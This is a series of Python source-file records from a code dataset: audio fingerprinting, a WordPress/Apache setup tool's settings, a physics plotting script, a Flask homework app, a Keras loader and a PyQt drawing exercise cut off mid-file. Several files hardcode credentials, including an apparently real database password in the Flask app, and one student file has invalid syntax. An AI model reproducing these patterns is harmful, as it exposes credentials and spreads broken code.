self.db.insert_song(song_name)\n\n        self.db.insert_hashes(sid, hashes)\n        self.db.set_song_fingerprinted(sid)\n        self.get_fingerprinted_songs()\n        return len(hashes), sid\n\n    def find_matches(self, samples, Fs=fingerprint.DEFAULT_FS):\n        hashes = fingerprint.fingerprint(samples, Fs=Fs)\n        return self.db.return_matches(hashes)\n\n    def align_matches(self, matches):\n        \"\"\"\n            Finds hash matches that align in time with other matches and finds\n            consensus about which hashes are \"true\" signal from the audio.\n\n            Returns a dictionary with match information.\n        \"\"\"\n        # align by diffs\n        diff_counter = {}\n        largest = 0\n        largest_count = 0\n        song_id = -1\n        for tup in matches:\n            sid, diff = tup\n            if diff not in diff_counter:\n                diff_counter[diff] = {}\n            if sid not in diff_counter[diff]:\n                diff_counter[diff][sid] = 0\n            diff_counter[diff][sid] += 1\n\n            if diff_counter[diff][sid] > largest_count:\n                largest = diff\n                largest_count = diff_counter[diff][sid]\n                song_id = sid\n\n        # extract idenfication\n        song = self.db.get_song_by_id(song_id)\n        if song:\n            # TODO: Clarify what `get_song_by_id` should return.\n            songname = song.get(Dejavu.SONG_NAME, None)\n        else:\n            return None\n\n        # return match info\n        nseconds = round(float(largest) / fingerprint.DEFAULT_FS *\n                         fingerprint.DEFAULT_WINDOW_SIZE *\n                         fingerprint.DEFAULT_OVERLAP_RATIO, 5)\n        song = {\n            Dejavu.SONG_ID: song_id,\n            Dejavu.SONG_NAME: songname,\n            Dejavu.CONFIDENCE: largest_count,\n            Dejavu.OFFSET: int(largest),\n            Dejavu.OFFSET_SECS: nseconds\n        }\n\n        return song\n\n    def recognize(self, recognizer, *options, **kwoptions):\n        r = recognizer(self)\n        return r.recognize(*options, **kwoptions)\n\n\ndef _fingerprint_worker(filename, limit=None, song_name=None):\n    # Pool.imap sends arguments as tuples so we have to unpack\n    # them ourself.\n    try:\n        filename, limit = filename\n    except ValueError:\n        pass\n\n    songname, extension = os.path.splitext(os.path.basename(filename))\n    song_name = song_name or songname\n    channels, Fs = decoder.read(filename, limit)\n    result = set()\n    channel_amount = len(channels)\n\n    for channeln, channel in enumerate(channels):\n        # TODO: Remove prints or change them into optional logging.\n        print(\"Fingerprinting channel %d/%d for %s\" % (channeln + 1,\n                                                       channel_amount,\n                                                       filename))\n        hashes = fingerprint.fingerprint(channel, Fs=Fs)\n        print(\"Finished channel %d/%d for %s\" % (channeln + 1, channel_amount,\n                                                 filename))\n        result |= set(hashes)\n\n    return song_name, result\n\n\ndef chunkify(lst, n):\n    \"\"\"\n    Splits a list into roughly n equal parts.\n    http://stackoverflow.com/questions/2130016/splitting-a-list-of-arbitrary-size-into-only-roughly-n-equal-parts\n    \"\"\"\n    return [lst[i::n] for i in xrange(n)]\n"}
{"blob_id": "aa6d701c19dc52cbb0c3abdfa5fa1970d39343be", "directory_id": "163bbb4e0920dedd5941e3edfb2d8706ba75627d", "path": "/Code/CodeRecords/2482/60829/280705.py", "content_id": "5973613bdc5d7fe19ce40088faaa5a99d02f2080", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "AdamZhouSE/pythonHomework", "snapshot_id": "a25c120b03a158d60aaa9fdc5fb203b1bb377a19", "revision_id": "ffc5606817a666aa6241cfab27364326f5c066ff", "branch_name": "refs/heads/master", "visit_date": "2022-11-24 08:05:22.122011", "revision_date": "2020-07-28 16:21:24", "committer_date": "2020-07-28 16:21:24", "github_id": "259576640", "star_events_count": "2", "fork_events_count": "1", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "188", "extension": "py", "content": "n=int(input())\nfor p in range(n):\n    a=int(input())\n    b=int(input())\n    k=a/b\n    if k==1.6666666666666667:\n        k=1.(6)\n    if k==2.6666666666666665:\n        k=2.(6)\n    print(a/b)"}
{"blob_id": "2b4fa1ed1d9e7b68a5dc5ef9f7badb27925bdd74", "directory_id": "fe2c07f37fe5fa7bdd881ce737e53ec59a593866", "path": "/ww/settings.py", "content_id": "d2afc456846368f66b9f3e5a202d96749fa1c833", "detected_licenses": "['LicenseRef-scancode-warranty-disclaimer', 'MIT']", "license_type": "permissive", "repo_name": "hbradleyiii/ww", "snapshot_id": "59c9b90564139ec247a41772f3f25032b24eded7", "revision_id": "5a537ab6865fcfb43a253cdb8cf2397a53d940a7", "branch_name": "refs/heads/master", "visit_date": "2021-01-15 15:36:51.063851", "revision_date": "2016-11-04 18:50:22", "committer_date": "2016-11-04 18:50:22", "github_id": "45983627", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "2079", "extension": "py", "content": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n#\n# name:             settings.py\n# author:           Harold Bradley III\n# email:            harold@bradleystudio.net\n# created on:       01/23/2016\n#\n# description:      The settings file for ww\n#\n\nfrom __future__ import absolute_import, print_function\n\nimport os\nimport time\n\n\nTEMPLATE_PATH = os.path.dirname(os.path.realpath(__file__)) + '/../templates/'\n\n\n## Change these settings to your hearts content ##\n\n# Site Settings\nSITE_ADMIN_EMAIL = 'email@mail.com'\nSITE_ERROR_LOG = 'error.log'\nSITE_ACCESS_LOG = 'access.log'\n\nWWW_DIR = '/var/www/'\nWWW_USR = 'www-data'\nWWW_ADMIN = 'admin_usr'\n\nGITIGNORE_TEMPLATE = TEMPLATE_PATH + 'gitignore.template'\n\nHTA_5G_TEMPLATE = TEMPLATE_PATH + '5g-htaccess.template'\n\nVHOST_PATH = '/etc/apache2/sites-available/'\nVHOST_TEMPLATE = TEMPLATE_PATH + 'vhost.template'\nVHOST_SSL_TEMPLATE = TEMPLATE_PATH + 'vhost-ssl.template'\n\nMYSQL = {\n    'host'     : 'localhost',\n    'user'     : 'username',\n    'password' : 'password123',\n}\n\n# WordPress Settings\nWP_LATEST      = 'http://wordpress.org/latest.tar.gz'\nWP_SETUP_URL   = '/wp-admin/setup-config.php?step=2'\nWP_INSTALL_URL = '/wp-admin/install.php?step=2'\n\nWP_HTA_TEMPLATE = TEMPLATE_PATH + 'wordpress-htaccess.template'\nWP_HTA_HARDENED_TEMPLATE = TEMPLATE_PATH + 'hardened-wordpress-htaccess.template'\nWP_CONFIG_TEMPLATE = TEMPLATE_PATH + 'wp-config.php.template'\n\nWP_ADMIN_USER  = 'admin'\nWP_ADMIN_EMAIL = 'admin@wp.com'\nWP_ADMIN_PW    = 'password123' # Please change this.\n\nWP_SALT_URL = 'https://api.wordpress.org/secret-key/1.1/salt/'\n\n# Apache commands\nCMD_RESTART_APACHE = 'sudo service apache2 reload'\nCMD_ENABLE_CONFIG  = 'sudo a2ensite '  # run as: {command} domain\nCMD_DISABLE_CONFIG = 'sudo a2dissite '  # run as: {command} domain\nCMD_CHECK_IF_ENABLED = \"apache2ctl -S | grep ' namevhost {0} '\"  # See if apache is serving domain ({})\n\n\n# Try to import local settings. This is a temporary work-around for now.\ntry:\n    from .settings_local import *\nexcept ImportError:\n    print(\"Can't find settings_local. Using default settings.\")\n"}
{"blob_id": "06bd72341a5c24dd643ccb8cc340e1841fa837c8", "directory_id": "decaa8d725e8e2e0d42fb4e3a9e6045f4c1f0666", "path": "/entanglement_scaling.py", "content_id": "35dd3ffa5398c30293505db1f49df302aa3cb247", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "lhillber/qca", "snapshot_id": "535045b12a3428cc300d959c0c621dc7cf444f8d", "revision_id": "a0aed22a0f7e57148b54f947ae06761dac4cfff9", "branch_name": "refs/heads/master", "visit_date": "2022-01-29 08:02:33.882091", "revision_date": "2022-01-10 16:55:20", "committer_date": "2022-01-10 16:55:20", "github_id": "39222017", "star_events_count": "8", "fork_events_count": "4", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "4174", "extension": "py", "content": "import matplotlib.pyplot as plt\nimport numpy as np\nfrom qca import QCA\nfrom figures import firstdiff, colors, names\n\nimport matplotlib as mpl\nfrom matplotlib import rc\nrc(\"text\", usetex=True)\nfont = {\"size\": 12, \"weight\": \"normal\"}\nmpl.rc(*(\"font\",), **font)\nmpl.rcParams[\"pdf.fonttype\"] = 42\nmpl.rcParams[\"text.latex.preamble\"] = [\n    r\"\\usepackage{amsmath}\",\n    r\"\\usepackage{sansmath}\",  # sanserif math\n    r\"\\sansmath\",\n]\n\n\ndef measure_Lscaling(\n    Skey,\n    Lkey=[6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19],\n    BC=\"1-00\",\n    ICkey=[\"c3_f1\", \"R123\"],\n    V=\"H\",\n    T=1000,\n    axs=None,\n    measures=[\"C\", \"Y\"],\n    line_kwargs=dict(),\n    scatter_kwargs=dict()\n):\n    if axs is None:\n        fig, axs = plt.subplots(2, 1, figsize=(1.3, 1.0), sharex=True)\n\n    lta = np.zeros((len(Skey), len(ICkey), len(Lkey), len(measures)))\n    dlta = np.zeros((len(Skey), len(ICkey), len(Lkey), len(measures)))\n    for i, S in enumerate(Skey):\n        for j, IC in enumerate(ICkey):\n            for k, L in enumerate(Lkey):\n                Q = QCA(\n                    dict(\n                        L=L,\n                        T=T,\n                        dt=1,\n                        R=S,\n                        r=1,\n                        V=V,\n                        IC=IC,\n                        BC=BC,\n                        E=0,\n                        N=1,\n                        totalistic=False,\n                        hamiltonian=False,\n                        trotter=True,\n                        symmetric=False,\n                    )\n                )\n                # Q.check_repo(test=False)\n                for m, meas in enumerate(measures):\n                    if meas[0] == \"D\":\n                        d = Q.get_measure(meas[1:], save=True)\n                        d = np.abs(firstdiff(d, acc=2, dx=1))\n\n                    else:\n                        d = Q.get_measure(meas, save=True)\n                    d = d[500:]\n                    lta[i, j, k, m] = np.mean(d)\n                    dlta[i, j, k, m] = np.std(d)\n                Q.close()\n    for m, measure in enumerate(measures):\n        ax = axs[m]\n        for i, S in enumerate(Skey):\n            c = colors[S]\n            for j, IC in enumerate(ICkey):\n                y = lta[i, j, :, m]\n                dy = dlta[i, j, :, m]\n                x = Lkey\n                #ax.fill_between(x, y + dy, y - dy, facecolor=c, alpha=0.2)\n                if BC[0] == \"1\":\n                    bc = \"fixed\"\n                    edgecolors = c\n                    facecolors = c\n                elif BC[0] == \"0\":\n                    bc = \"periodic\"\n                    edgecolors = c\n                    facecolors = \"none\"\n                ax.scatter(x, y, marker=\"o\", s=15,\n                           edgecolor=edgecolors, facecolors=facecolors, label=\"$T_{%s}$, %s BC\" % (S, bc))\n                mm, bb = np.polyfit(x, y, 1)\n                xs = np.linspace(x[0], x[-1], 100)\n                ys = bb + mm * xs\n                #label=f\"$\\lambda = {round(mm, 2)}$\"\n                ax.plot(xs, ys, c=c, **line_kwargs)\n                print(f\"{measure} slope ** V={V}, S={S}, BC={BC}: {mm}\")\n        ax.plot(np.array(x), np.array(x)//2, c=\"k\")\n        #ax.scatter(x, r, marker=\"o\", s=8, c=\"k\")\n        #ax.fill_between(x, r + dr, r - dr, facecolor=\"k\", alpha=0.2)\n\n        ax.legend(bbox_to_anchor=(1, 1))\n\n        ax.set_xticks([6, 10, 14, 18])\n        ax.set_xticklabels([6, 10, 14, 18])\n        ax.set_ylabel(names[measure + \"avg\"])\n        ax.set_xlabel(r\"System size, $L$\")\n\n\nfig, axs = plt.subplots(1, 1, figsize=(3.375, 4))\nmeasure_Lscaling(\n    Skey=[1, 6, 13, 14],\n    Lkey=[6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19],\n    BC=\"1-00\",\n    ICkey=[\"c3_f1\"],\n    V=\"H\",\n    T=1000,\n    axs=[axs],\n    measures=[\"sbisect_2\"],\n)\n\nmeasure_Lscaling(\n    Skey=[1, 6, 13, 14],\n    Lkey=[6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19],\n    BC=\"0\",\n    ICkey=[\"c3_f1\"],\n    V=\"H\",\n    T=1000,\n    axs=[axs],\n    measures=[\"sbisect_2\"],\n    scatter_kwargs={\"facecolor\": \"none\"},\n    line_kwargs={\"ls\": \"--\"}\n)\n\nplt.savefig(\"figures/Lscaling_BC-conditions.pdf\", bbox_inches=\"tight\")\n"}
{"blob_id": "c3a3945722d501b483b051bf5c67cada78f16d8f", "directory_id": "22b4820ae03f5d82c9824ea0e27bd4ad5d8f5ed9", "path": "/HW3_ROBURGES.py", "content_id": "e913ca33d9d3588e32b3c402a1ffea712a58cdfa", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "roburges/HW3", "snapshot_id": "00ee2621f18992fec4117c4e84a391c919355470", "revision_id": "2a0289327b242a56c258e6154c8744fce6fdeb0f", "branch_name": "refs/heads/master", "visit_date": "2021-04-29 16:19:55.589699", "revision_date": "2018-02-23 02:08:17", "committer_date": "2018-02-23 02:08:17", "github_id": "121647253", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "2018-02-15 15:42:35", "gha_created_at": "2018-02-15 15:42:35", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "11323", "extension": "py", "content": " ## SI 364 - Winter 2018\n ## HW 3\n\n####################\n ## Import statements\n ####################\n\nfrom flask import Flask, render_template, session, redirect, url_for, flash, request\nfrom flask_wtf import FlaskForm\nfrom wtforms import StringField, SubmitField, ValidationError\nfrom wtforms.validators import Required, Length\nfrom flask_sqlalchemy import SQLAlchemy\n\n ############################\n # Application configurations\n ############################\napp = Flask(__name__)\napp.config['SECRET_KEY'] = 'hard to guess string from si364'\n## TODO 364: Create a database in postgresql in the code line below, and fill in your app's database URI. It should be of the format: postgresql://localhost/YOUR_DATABASE_NAME\n\n ## Your final Postgres database should be your uniqname, plus HW3, e.g. \"jczettaHW3\" or \"maupandeHW3\"\napp.config[\"SQLALCHEMY_DATABASE_URI\"] = \"postgresql://postgres:Soulfood123@localhost:5432/roburgesHW3\"\n## Provided:\napp.config['SQLALCHEMY_COMMIT_ON_TEARDOWN'] = True\napp.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False\n\n##################\n### App setup ####\n##################\ndb = SQLAlchemy(app) # For database use\n\n#########################\n#########################\n######### Everything above this line is important/useful setup,\n## not problem-solving.##\n#########################\n#########################\n\n#########################\n##### Set up Models #####\n#########################\n\n####TODO 364: Set up the following Model classes, as described, with the respective fields (data types).\n\n## The following relationships should exist between them:\n# Tweet:User - Many:One\n\n# - Tweet\n## -- id (Integer, Primary Key)\n## -- text (String, up to 280 chars)\n## -- user_id (Integer, ID of user posted -- ForeignKey)\n\n## Should have a __repr__ method that returns strings of a format like:\n#### {Tweet text...} (ID: {tweet id})\n\n\nclass Tweet(db.Model):\n\t__tablename__ = \"tweets\"\n\tid = db.Column(db.Integer, primary_key = True)\n\ttext = db.Column(db.String(280))\n\tuser_id = db.Column(db.Integer, db.ForeignKey(\"users.id\"))\n\n\tdef __repr__(self):\n\t\treturn \"{\" + self.text + \"} | ID: {\" + str(self.id) + \"}\"\n\n# - User\n## -- id (Integer, Primary Key)\n## -- username (String, up to 64 chars, Unique=True)\n## -- display_name (String, up to 124 chars)\n## ---- Line to indicate relationship between Tweet and User tables (the 1 user: many tweets relationship)\n\n## Should have a __repr__ method that returns strings of a format like:\n#### {username} | ID: {id}\n\nclass User(db.Model):\n\t__tablename__ = \"users\"\n\tid = db.Column(db.Integer, primary_key = True)\n\tusername = db.Column(db.String(64), unique = True)\n\tdisplay_name = db.Column(db.String(124))\n\ttweets = db.relationship('Tweet', backref='User')\n\n\tdef __repr__(self):\n\t\treturn \"{\" + self.username + \"} | ID: {\" + str(self.id) + \"}\"\n\n########################\n##### Set up Forms #####\n########################\n\n# TODO 364: Fill in the rest of the below Form class so that someone running this web app will be able to fill in information about tweets they wish existed to save in the database:\n\n## -- text: tweet text (Required, should not be more than 280 characters)\n## -- username: the twitter username who should post it (Required, should not be more than 64 characters)\n## -- display_name: the display name of the twitter user with that username (Required, + set up custom validation for this -- see below)\n\n# HINT: Check out index.html where the form will be rendered to decide what field names to use in the form class definition\n\n# TODO 364: Set up custom validation for this form such that:\n# - the twitter username may NOT start with an \"@\" symbol (the template will put that in where it should appear)\n# - the display name MUST be at least 2 words (this is a useful technique to practice, even though this is not true of everyone's actual full name!)\n\n# TODO 364: Make sure to check out the sample application linked in the readme to check if yours is like it!\n\nclass TweetForm(FlaskForm):\n    num_tweets = StringField()\n    text = StringField('Enter the text of the tweet (no more than 280 chars):', validators = [Required(), Length(1,280)])\n    username = StringField('Enter the username of the twitter user (no \"@\"!):', validators = [Required(), Length(1,64)])\n    display_name = StringField('Enter the display name for the twitter user (must be at least 2 words):', validators = [Required()])\n    submit = SubmitField(\"Submit\")\n# check for 280 characters\n    def validate_text(self, field):\n        if len(str(field.data)) > 280:\n            raise ValidationError('Field must be between 1 and 280 characters long.')\n    # check for '@' symbol\n    def validate_username(self, field):\n        if str(field.data).startswith('@'):\n            raise ValidationError('Username cannot start with @')\n    def validate_display_name(self, field):\n        if len(str(field.data).split()) != 2:\n            raise ValidationError('Display name is not at least 2 words and must be.')\n\n###################################\n##### Routes & view functions #####\n###################################\n\n## Error handling routes - PROVIDED\n@app.errorhandler(404)\ndef page_not_found(e):\n    return render_template('404.html'), 404\n\n\n@app.errorhandler(500)\ndef internal_server_error(e):\n    return render_template('500.html'), 500\n\n#############\n## Main route\n#############\n\n## TODO 364: Fill in the index route as described.\n\n# A template index.html has been created and provided to render what this route needs to show -- YOU just need to fill in this view function so it will work.\n# Some code already exists at the end of this view function -- but there's a bunch to be filled in.\n## HINT: Check out the index.html template to make sure you're sending it the data it needs.\n## We have provided comment scaffolding. Translate those comments into code properly and you'll be all set!\n\n# NOTE: The index route should:\n# - Show the Tweet form.\n# - If you enter a tweet with identical text and username to an existing tweet, it should redirect you to the list of all the tweets and a message that you've already saved a tweet like that.\n# - If the Tweet form is entered and validates properly, the data from the form should be saved properly to the database, and the user should see the form again with a message flashed: \"Tweet successfully saved!\"\n# Try it out in the sample app to check against yours!\n\n@app.route('/', methods=['GET', 'POST'])\ndef index():\n    # Initialize the form\n\tform = TweetForm()\n    # Get the number of Tweets\n\tnum_tweets = Tweet.query.count()\n\tusername = form.username.data\n\tdisplay_name = form.display_name.data\n\ttext = form.text.data\n\n\t# If the form was posted to this route,\n\t## Get the data from the form\n\tif request.method == 'POST' and form.validate_on_submit():\n\t    ## Find out if there's already a user with the entered username\n\t    ## If there is, save it in a variable: user\n\t    ## Or if there is not, then create one and add it to the database\n\t\tuser = User.query.filter_by(username = username).first()\n\t\tif user:\n\t\t\tuser=user\n\t\t\tredirect(url_for('index'))\n\t\t\tflash(\"Username already exists\")\n\t\t\trender_template('all_tweets.html')\n\t\t\t##user = User(username = username, display_name = display_name)\n\t\tif not user:\n\t\t\tuser = User(username = username, display_name = display_name)\n\t\t\tdb.session.add(user)\n\t\t\tdb.session.commit()\n ## If there already exists a tweet in the database with this text and this user id (the id of that user variable above...) ## Then flash a message about the tweet already existing\n    ## And redirect to the list of all tweets\n\t\ttweet = Tweet.query.filter_by(text = text, user_id = user.id).first()\n\t\tif tweet and user.id:\n\t\t\ttweet=tweet\n\t\t\tredirect(url_for('index'))\n\t\t\tflash('This tweet and user combination exists already')\n\t\t    ## Assuming we got past that redirect,\n\t    ## Create a new tweet object with the text and user id\n\t    ## And add it to the database\n\t    ## Flash a message about a tweet being successfully added\n\t    ## Redirect to the index page\n\t\telse:\n\t\t\ttweet = Tweet(text = text, user_id = user.id)\n\t\t\tdb.session.add(tweet)\n\t\t\tdb.session.commit()\n\t\t\tflash('Tweet was added')\n\t\t\tredirect(url_for('index'))\n\n# PROVIDED: If the form did NOT validate / was not submitted\n\terrors = [v for v in form.errors.values()]\n\tif len(errors) > 0:\n\t\tflash(\"!!!! ERRORS IN FORM SUBMISSION - \" + str(errors))\n\treturn render_template('index.html', form = form, num_tweets = num_tweets, text = text, username = username, display_name = display_name) # TODO 364: Add more arguments to the render_template invocation to send data to index.html\n\n@app.route('/all_tweets')\ndef see_all_tweets():\n    # TODO 364: Fill in this view function so that it can successfully render the template all_tweets.html, which is provided.\n    # HINT: Careful about what type the templating in all_tweets.html is expecting! It's a list of... not lists, but...\n    # HINT #2: You'll have to make a query for the tweet and, based on that, another query for the username that goes with it...\n    tweets = Tweet.query.all()\n    all_tweets = []\n    for tweet in tweets:\n        # all_tweets.append((tweet.text, tweet.user_id))\n        user = User.query.filter_by(id = tweet.user_id).first()\n        info=(tweet.text, user.username)\n        all_tweets.append(info)\n\n    return render_template('all_tweets.html', all_tweets = all_tweets)\n\n@app.route('/all_users')\ndef see_all_users():\n    # TODO 364: Fill in this view function so it can successfully render the template all_users.html, which is provided.\n    users = User.query.all()\n    return render_template('all_users.html', users = users)\n# TODO 364\n# Create another route (no scaffolding provided) at /longest_tweet with a view function get_longest_tweet (see details below for what it should do)\n# TODO 364\n# Create a template to accompany it called longest_tweet.html that extends from base.html.\n\n# NOTE:\n# This view function should compute and render a template (as shown in the sample application) that shows the text of the tweet currently saved in the database which has the most NON-WHITESPACE characters in it, and the username AND display name of the user that it belongs to.\n# NOTE: This is different (or could be different) from the tweet with the most characters including whitespace!\n# Any ties should be broken alphabetically (alphabetically by text of the tweet). HINT: Check out the chapter in the Python reference textbook on stable sorting.\n# Check out /longest_tweet in the sample application for an example.\n\n# HINT 2: The chapters in the Python reference textbook on:\n## - Dictionary accumulation, the max value pattern\n## - Sorting\n# may be useful for this problem!\n@app.route('/longest_tweet')\ndef longest_tweet():\n    usertweets = User.query.all()\n    tweets = []\n    for tweet in usertweets:\n        tweets.append((len(tweet.tweets[0].text.replace(' ', '')), tweet.tweets[0].text, tweet.username, tweet.display_name))\n\n    tweets.sort(key=lambda x : (-x[0], x[1]))\n    return render_template('longest_tweet.html', longest_tweet = tweets[0][1], username = tweets[0][2], display_name = tweets[0][3])  ##https://stackoverflow.com/questions/4010322/sort-a-list-of-class-instances-python\nif __name__ == '__main__':\n    db.create_all() # Will create any defined models when you run the application\n    app.run(use_reloader=True,debug=True) # The usual\n"}
{"blob_id": "79cbb644c1d763246ebe0b16c6e76077be707343", "directory_id": "c620adec3a8908065abe4d1fd1fd895a0fec7fb3", "path": "/utils.py", "content_id": "58542bfb78b9e196e466388b9fc208b1b859971d", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "retdop/keras_char_rnn_server", "snapshot_id": "e7ff5299dcd6619e76ea2286b4d86dbb31b28453", "revision_id": "fb130a8ad576ff1fde40170432a715aaf9accd75", "branch_name": "refs/heads/master", "visit_date": "2021-01-24 18:59:24.677140", "revision_date": "2018-02-28 17:39:06", "committer_date": "2018-02-28 17:39:06", "github_id": "86173043", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "1571", "extension": "py", "content": "from __future__ import print_function\nfrom keras.models import Sequential, load_model\nfrom keras.layers import Dense, Activation\nfrom keras.layers import LSTM\nfrom keras.optimizers import RMSprop\nfrom keras.utils.data_utils import get_file\nimport numpy as np\nimport random\nimport sys\nimport os\n\nMAX_LEN = 40\n\nclass TextLoader():\n    def __init__(self):\n        self.MAX_LEN = 40\n        path = 'data/python/scikit_cleaned.txt'\n        self.text = open(path).read()\n        print('corpus length:', len(self.text))\n\n        self.chars = sorted(list(set(self.text)))\n        print('total chars:', len(self.chars))\n        self.char_indices = dict((c, i) for i, c in enumerate(self.chars))\n        self.indices_char = dict((i, c) for i, c in enumerate(self.chars))\n\n        # cut the text in semi-redundant sequences of MAX_LEN characters\n        step = 3\n        self.sentences = []\n        self.next_chars = []\n        for i in range(0, len(self.text) - MAX_LEN, step):\n            self.sentences.append(self.text[i: i + MAX_LEN])\n            self.next_chars.append(self.text[i + MAX_LEN])\n        print('nb sequences:', len(self.sentences))\n\n        print('Vectorization...')\n        self.X = np.zeros((len(self.sentences), MAX_LEN, len(self.chars)), dtype=np.bool)\n        self.y = np.zeros((len(self.sentences), len(self.chars)), dtype=np.bool)\n        for i, sentence in enumerate(self.sentences):\n            for t, char in enumerate(sentence):\n                self.X[i, t, self.char_indices[char]] = 1\n            self.y[i, self.char_indices[self.next_chars[i]]] = 1\n"}
{"blob_id": "49487fe4e3c2ebcd5780e180ea40c8165f2f20de", "directory_id": "2a92196f93ac46bc7321251cf57715c4c768911b", "path": "/lab_02/window.py", "content_id": "28c338446ee504ecc0b0ed99b881b193faabe7c1", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "Ermako27/computer-graphics-sem4", "snapshot_id": "ddea2b5e352f463d90058be5b53a52fec41a66a6", "revision_id": "f7f11db15ac0146d3a571570b7e1c00045f9c57d", "branch_name": "refs/heads/master", "visit_date": "2021-05-02 17:54:32.858672", "revision_date": "2018-12-01 20:24:29", "committer_date": "2018-12-01 20:24:29", "github_id": "120654062", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "2018-03-27 23:49:08", "gha_created_at": "2018-02-07 18:26:26", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "14711", "extension": "py", "content": "import sys\nfrom PyQt5.QtCore import Qt, QPointF, QPoint, QRectF\nfrom PyQt5.QtWidgets import QWidget, QApplication, QGraphicsScene, QGraphicsView, QGraphicsItem\nfrom PyQt5.QtGui import QPainter, QColor, QBrush\nfrom PyQt5 import uic\n\nfrom math import radians, cos, sin, pi\nimport numpy as np\n\n\n\nclass Picture(QGraphicsItem):\n    def __init__(self):\n        super(Picture, self).__init__()\n\n        self.bottomX = [80*cos(-1*t) + 520 for t in np.arange(0, pi, 0.001)]  # \u043d\u0438\u0436\u043d\u0430\u044f \u0434\u0443\u0433\u0430\n        self.bottomY = [15*sin(-1*t) + 580 for t in np.arange(0, pi, 0.001)]\n\n\n        self.rightX = [520 + (self.bottomX[i] - 520) * cos(radians(120)) + (self.bottomY[i] - 580) *\n                       sin(radians(120)) + 42 for i in range(len(self.bottomX))]  # \u043f\u0440\u0430\u0432\u0430\u044f \u0434\u0443\u0433\u0430\n        self.rightY = [580 - (self.bottomX[i] - 520) * sin(radians(120)) + (self.bottomY[i] - 580) *\n                       cos(radians(120)) - 70 for i in range(len(self.bottomY))]\n\n\n        self.leftX = [520 + (self.bottomX[i] - 520) * cos(radians(240)) + (self.bottomY[i] - 580) *\n                       sin(radians(240)) - 42 for i in range(len(self.bottomX))]  # \u043f\u0440\u0430\u0432\u0430\u044f \u0434\u0443\u0433\u0430\n        self.leftY = [580 - (self.bottomX[i] - 520) * sin(radians(240)) + (self.bottomY[i] - 580) *\n                       cos(radians(240)) - 70 for i in range(len(self.bottomY))]\n\n        self.leftLine = [520, 440, 600, 580]  # \u043b\u0438\u043d\u0438\u0438\n        self.rightLine = [520, 440, 440, 580]\n\n        self.pTopleft = [440, 440]  # \u043a\u0432\u0430\u0434\u0440\u0430\u0442\n        self.pTopright = [600, 440]\n        self.pBotright = [600, 580]\n        self.pBotleft = [440, 580]\n        \n        # \u043f\u0440\u0435\u0434\u044b\u0434\u0443\u0449\u0435\u0435 \u0441\u043e\u0441\u0442\u043e\u044f\u043d\u0438\u0435\n        self.prev_bottomX = self.bottomX  # \u0434\u0443\u0433\u0438\n        self.prev_bottomY = self.bottomY\n        self.prev_leftX = self.leftX\n        self.prev_leftY = self.leftY\n        self.prev_rightX = self.rightX\n        self.prev_rightY = self.rightY\n\n        self.prev_leftLine = self.leftLine[:]  # \u043b\u0438\u043d\u0438\u0438\n        self.prev_rightLine = self.rightLine[:]\n\n        self.prev_pTopleft = self.pTopleft[:]  # \u043a\u0432\u0430\u0434\u0440\u0430\u0442\n        self.prev_pTopright = self.pTopright[:]\n        self.prev_pBotright = self.pBotright[:]\n        self.prev_pBotleft = self.pBotleft[:]\n\n    def paint(self, painter, option, widget):\n\n\n        # \u043e\u0442\u0440\u0438\u0441\u043e\u0432\u043a\u0430 \u0434\u0443\u0433\n        for i in range(len(self.bottomX)):\n            painter.drawLine(self.bottomX[i], self.bottomY[i], self.bottomX[i] + 0.01, self.bottomY[i] + 0.01)\n            painter.drawLine(self.rightX[i], self.rightY[i], self.rightX[i] + 0.01, self.rightY[i] + 0.01)\n            painter.drawLine(self.leftX[i], self.leftY[i], self.leftX[i] + 0.01, self.leftY[i] + 0.01)\n        # \u043e\u0442\u0440\u0438\u0441\u043e\u0432\u043a\u0430 \u043f\u0440\u044f\u043c\u043e\u0443\u0433\u043e\u043b\u044c\u043d\u0438\u043a\u0430\n        painter.drawPolygon(\n            QPointF(self.pTopleft[0], self.pTopleft[1]),\n            QPointF(self.pTopright[0], self.pTopright[1]),\n            QPointF(self.pBotright[0], self.pBotright[1]),\n            QPointF(self.pBotleft[0], self.pBotleft[1]),\n        )\n\n        # \u043e\u0442\u0440\u0438\u0441\u043e\u0432\u043a\u0430 \u043b\u0438\u043d\u0438\u0439\n        painter.drawLine(self.leftLine[0], self.leftLine[1], self.leftLine[2], self.leftLine[3])\n        painter.drawLine(self.rightLine[0], self.rightLine[1], self.rightLine[2], self.rightLine[3])\n\n    def boundingRect(self):\n        return QRectF(10, 10, 1000, 1000)\n\n    def moveFunc(self, place):\n        # \u043f\u0440\u0435\u0434\u044b\u0434\u0443\u0449\u0435\u0435 \u0441\u043e\u0441\u0442\u043e\u044f\u043d\u0438\u0435\n        self.prev_bottomX = self.bottomX  # \u0434\u0443\u0433\u0438\n        self.prev_bottomY = self.bottomY\n        self.prev_leftX = self.leftX\n        